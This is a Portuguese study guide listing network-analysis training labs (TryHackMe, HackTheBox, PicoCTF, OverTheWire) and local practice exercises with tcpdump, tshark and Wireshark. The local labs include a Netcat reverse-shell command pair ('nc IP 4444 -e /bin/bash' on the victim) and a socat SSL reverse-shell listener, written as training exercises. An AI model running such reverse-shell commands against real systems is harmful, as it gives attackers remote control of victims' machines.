# Labs de Análise de Rede

## Pré-requisitos

| Pré-requisito | Nível | Observação |
|---------------|-------|------------|
| Kali Linux | ⭐⭐ | Com tcpdump, tshark, Wireshark |
| Módulo 1 | ⭐⭐ | Reconhecimento concluído |
| Redes básicas | ⭐ | TCP/IP, portas, protocolos |

---

## Labs por Plataforma

### TryHackMe (9 labs)

| # | Lab | Tópicos | Dificuldade | URL |
|---|-----|---------|-------------|-----|
| 1 | Wireshark: The Basics | Captura, filtros, análise de protocolos | ⭐ | https://tryhackme.com/room/wireshark |
| 2 | Wireshark: Packet Operations | Filtros avançados, export, estatísticas | ⭐⭐ | https://tryhackme.com/room/wiresharkpacketoperations |
| 3 | TShark | CLI do Wireshark, filtros, campos | ⭐⭐ | https://tryhackme.com/room/tshark |
| 4 | Network Traffic Analysis | Análise de tráfego suspeito, malware | ⭐⭐⭐ | https://tryhackme.com/room/roomnetworktrafficanalysis |
| 5 | Forensics (pcap) | Análise forense de captures | ⭐⭐ | https://tryhackme.com/room/forensics |
| 6 | Packed Light (pcap analysis) | Análise depcap avançada | ⭐⭐⭐ | https://tryhackme.com/room/packedlight |
| 7 | PCAP Analysis | Análise de tráfego de rede | ⭐⭐ | https://tryhackme.com/room/pcapanalysis |
| 8 | Basic Packet Capture | Captura com tcpdump e tshark | ⭐ | https://tryhackme.com/room/basicpacketcapture |
| 9 | Sniff | Sniffing de rede, ARP spoofing | ⭐⭐ | https://tryhackme.com/room/sniff |

> **Nota:** URLs podem mudar — verifique no site da plataforma.

### HackTheBox (1 lab)

| # | Lab | Tópicos | Dificuldade | URL |
|---|-----|---------|-------------|-----|
| 10 | Starting Point (Network) | Análise de rede básica | ⭐⭐ | https://app.hackthebox.com/starting-point |

### PicoCTF (1 lab)

| # | Lab | Tópicos | Dificuldade | URL |
|---|-----|---------|-------------|-----|
| 11 | Forensics (packet analysis) | Análise de pacotes | ⭐-⭐⭐ | https://play.picoctf.org/practice |

> **Nota:** PicoCTF pode redirecionar — verifique se o link está ativo.

### OverTheWire (1 lab)

| # | Lab | Tópicos | Dificuldade | URL |
|---|-----|---------|-------------|-----|
| 12 | Bandit (network concepts) | Conceitos de rede, conectividade | ⭐ | ssh://bandit.labs.overthewire.org:2220 |

### Prática Local (6 labs)

| # | Lab | Tópicos | Dificuldade | Comando |
|---|-----|---------|-------------|---------|
| 13 | tcpdump capture HTTP | Capturar e analisar tráfego HTTP | ⭐⭐ | `sudo tcpdump -i eth0 port 80 -w http.pcap` |
| 14 | tshark extrair POST data | Extrair dados de requisições POST | ⭐⭐ | `tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data` |
| 15 | Wireshark GUI filtros | Usar filtros de display no Wireshark | ⭐⭐ | Abrir Wireshark → digitar filtro |
| 16 | Netcat reverse shell | Criar reverse shell com Netcat | ⭐⭐⭐ | `nc -lvnp 4444` (atacante) + `nc IP 4444 -e /bin/bash` (vítima) |
| 17 | Socat SSL reverse shell | Reverse shell criptografada | ⭐⭐⭐ | `socat OPENSSL-LISTEN:4444,cert=server.pem STDOUT` |
| 18 | DNS sniffing | Capturar queries DNS | ⭐ | `sudo tcpdump -i eth0 -nn port 53` |

---

## Resumo

| Plataforma | Labs | Foco |
|:-----------|:-----|:-----|
| TryHackMe | 9 | Wireshark, tshark, traffic analysis, forensics |
| HackTheBox | 1 | Starting point network |
| PicoCTF | 1 | Forensics packet analysis |
| OverTheWire | 1 | Bandit network concepts |
| Local | 6 | tcpdump, tshark, Wireshark, Netcat, Socat |
| **Total** | **18** | |
